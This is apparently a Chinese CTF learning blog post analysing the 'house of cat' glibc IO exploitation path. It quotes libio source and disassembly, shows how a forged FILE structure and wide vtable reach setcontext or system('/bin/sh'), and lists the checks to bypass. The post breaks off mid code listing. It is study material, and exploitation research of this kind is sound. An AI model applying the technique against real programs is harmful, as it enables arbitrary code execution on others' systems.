&lt;p&gt;这是一个比较新的路径，是 catF1y 师傅挖出来的一条链子，并且在强网杯初赛部署了同名题目。但是，就在比赛前夕，以为师傅连更两条博客，house of apple2 以及 house of apple3，导致了题目被非预期。同时，我们也尝试了使用 house of emma，成功非预期。这里就先开始预期解的 house of cat 的学习记录。&lt;/p&gt;
&lt;p&gt;高版本的 glibc 就是对 io 的疯狂脑洞输出。house of cat 也是一个有关 io 的利用路径。&lt;/p&gt;
&lt;h3 id=&#34;利用条件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用条件&#34;&gt;#&lt;/a&gt; 利用条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1. 能够任意地址写一个可控堆地址。&lt;/li&gt;
&lt;li&gt;2. 能够泄露堆地址和 libc 基址。&lt;/li&gt;
&lt;li&gt;3. 能够触发 IO 流（FSOP 或触发__malloc_assert），执行 IO 相关函数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其实从这里我们看出，这里的利用条件与其他的一些手法极为相似，基本就是利用 exit () 函数退出的一些操作。随着版本的迭代，glibc 对于虚表的保护也是不断的更新，首先就是对于 io_file_jump 的检查，包括但不限于禁止直接修改虚表内容、检查虚表地址是否合法（在规定的虚表地址范围内）。其实之前我们讲过利用 io_str_jump 的虚表绕过检查，但是当时的方法的弊端就是两个函数_IO_str_overflow 以及_IO_str_finish 的相关漏洞被封死。&lt;/p&gt;
&lt;p&gt;这里作者利用了一个新的 io 虚表结构体_IO_wfile_jumps，然后下面的操作与_IO_str_jumps 非常相似，甚至函数名字都很相似&lt;/p&gt;
&lt;p&gt;这里我先介绍下目标函数是如何实现然亦函数调用的，&lt;/p&gt;
&lt;p&gt;结构体&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_jump_t&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_wfile_jumps&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;libio_vtable&lt;/span&gt; =&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT_DUMMY,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(finish, _IO_new_file_finish),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(xsputn, _IO_wfile_xsputn),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(xsgetn, _IO_file_xsgetn),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seekoff, _IO_wfile_seekoff),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seekpos, _IO_default_seekpos),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(setbuf, _IO_new_file_setbuf),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(doallocate, _IO_wfile_doallocate),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(read, _IO_file_read),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(write, _IO_new_file_write),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seek, _IO_file_seek),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(close, _IO_file_close),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(stat, _IO_file_stat),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(showmanyc, _IO_default_showmanyc),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(imbue, _IO_default_imbue)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;原理，利用程序报错__malloc_asset 报错调用 xsputn, 替换该虚表函数为 _IO_wfile_seekfoff&lt;/p&gt;
&lt;p&gt;FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。&lt;/p&gt;
&lt;p&gt;其中的函数（_IO_wfile_seekoff）的内部结构为&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;off64_t&lt;/span&gt; _IO_wfile_seekoff (FILE *fp, &lt;span class=&#34;type&#34;&gt;off64_t&lt;/span&gt; offset, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dir, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; mode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;off64_t&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;off64_t&lt;/span&gt; delta, new_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (mode == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; do_ftell_wide (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; must_be_exact = ((fp-&amp;gt;_wide_data-&amp;gt;_IO_read_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            == fp-&amp;gt;_wide_data-&amp;gt;_IO_read_end)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;amp;&amp;amp; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               == fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#需要绕过was_writing的检测&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; was_writing = ((fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              || _IO_in_put_mode (fp));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (was_writing &amp;amp;&amp;amp; _IO_switch_to_wget_mode (fp))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; WEOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果 mode!=0 且 fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base 会调用_IO_switch_to_wget_mode 这个函数，继续跟进代码。虽然说这里要求的是 mode 值不为零，但是在最开始伪造的时候，mode 设置却还是 0，不过调试的时候，发现这里可能会发生变化，从我们传入的 0 变为了 - 1。经过测试，最开始也可以将 mode 设置为 1 ，后面触发__malloc_assert,mode 不会被更改。（这条仅在 house of cat 同名题目测试）。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _IO_switch_to_wget_mode (FILE *fp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;wint_t&lt;/span&gt;)_IO_WOVERFLOW (fp, WEOF) == WEOF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EOF;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;而_IO_WOVERFLOW 是 glibc 里定义的一个宏调用函数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&amp;gt;FUNC) (THIS, X1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到对_IO_WOVERFLOW 没有进行任何检测，为了便于理解，我们再来看看汇编代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0x7f4cae745d30 &amp;lt;_IO_switch_to_wget_mode&amp;gt;       endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d34 &amp;lt;_IO_switch_to_wget_mode+4&amp;gt;     mov    rax, qword ptr [rdi + 0xa0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d3b &amp;lt;_IO_switch_to_wget_mode+11&amp;gt;    push   rbx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d3c &amp;lt;_IO_switch_to_wget_mode+12&amp;gt;    mov    rbx, rdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d3f &amp;lt;_IO_switch_to_wget_mode+15&amp;gt;    mov    rdx, qword ptr [rax + 0x20]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d43 &amp;lt;_IO_switch_to_wget_mode+19&amp;gt;    cmp    rdx, qword ptr [rax + 0x18]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d47 &amp;lt;_IO_switch_to_wget_mode+23&amp;gt;    jbe    _IO_switch_to_wget_mode+56                &amp;lt;_IO_switch_to_wget_mode+56&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d49 &amp;lt;_IO_switch_to_wget_mode+25&amp;gt;    mov    rax, qword ptr [rax + 0xe0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d50 &amp;lt;_IO_switch_to_wget_mode+32&amp;gt;    mov    esi, 0xffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0x7f4cae745d55 &amp;lt;_IO_switch_to_wget_mode+37&amp;gt;    call   qword ptr [rax + 0x18]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在造成任意地址写一个堆地址的基础上，这里的寄存器 rdi（fake_IO 的地址）、rax 和 rdx 都是我们可以控制的，&lt;/p&gt;
&lt;p&gt;rdi 是我们伪造的 io_file 的地址，我们将 rax 控制为堆上的一个地址，就可以实现任意函数的调用。&lt;/p&gt;
&lt;p&gt;这里还要补习一下 setcontext 的知识&lt;/p&gt;
&lt;p&gt;在开启沙箱的情况下，假如把最后调用的 [rax + 0x18] 设置为 setcontext，把 rdx 设置为可控的堆地址，就能执行 srop 来读取 flag；如果未开启沙箱，则只需把最后调用的 [rax + 0x18] 设置为 system 函数，把 fake_IO 的头部写入 /bin/sh 字符串，就可执行 system (&amp;quot;/bin/sh&amp;quot;)&lt;/p&gt;
&lt;p&gt;fake_IO 结构体需要绕过的检测&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_wide_data-&amp;gt;_IO_read_ptr ！=_wide_data-&amp;gt;_IO_read_end&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; _wide_data-&amp;gt;_IO_write_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#如果_wide_data=fake_io_addr+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;，其实也就是fp-&amp;gt;_IO_save_base &amp;lt; f-&amp;gt;_IO_backup_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp``-``&amp;gt;_lock是一个可写地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp``-``&amp;gt;_mode ``=` `&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;大致的攻击流程&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;修改_IO_list_all 为可控地址（FSOP）或修改 stderr 为可控地址 (__malloc_assert)。&lt;/li&gt;
&lt;li&gt;在上一步的可控地址中伪造 fake_IO 结构体。&lt;/li&gt;
&lt;li&gt;通过 FSOP 或 malloc 触发攻击。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是当我进行到这里的时候，我发现不能独立正常的复现，因为作者的文章并没有给出这条完整利用链。&lt;/p&gt;
&lt;h3 id=&#34;问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#问题&#34;&gt;#&lt;/a&gt; 问题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;完整的利用链是从哪里触发， 完整的函数调用链是怎么样的？&lt;/li&gt;
&lt;li&gt;作者提出了两个不同的流程，一个是进行 FSOP，利用的是_IO_flush_all_lockp 函数来刷新所有的 IO 流。也就是说最后是进入 flush 函数，进行一系列的调用，对应的就是虚表中的_IO_overflow. 但是_IO_flush_all_lockp 触发的前提应该是能执行 exit (显式调用、libc 调用 abort、以及 main 函数正常退出)&lt;/li&gt;
&lt;li&gt;另外一个思路是利用利用__malloc_assert 触发的报错。会使用 stderr 进行一个报错输出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上，house of cat 的关键点是 JUMP_INIT (seekoff, _IO_wfile_seekoff), 顺利的进入后又会执行 _IO_switch_to_wget_mode (fp)，最大的问题就是如何进入这里 _IO_wfile_seekoff?&lt;/p&gt;
&lt;p&gt;以下为个人的分析过程&lt;/p&gt;
&lt;p&gt;我们要知道这里代替了谁。函数的入口在于 IO 函数初始化后调用谁的问题，因为我们是对 vtable 进行了偏移替换，所以我们将二者进行一个对比。&lt;/p&gt;
&lt;p&gt;修改前的 IO_list_all 的对应&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span 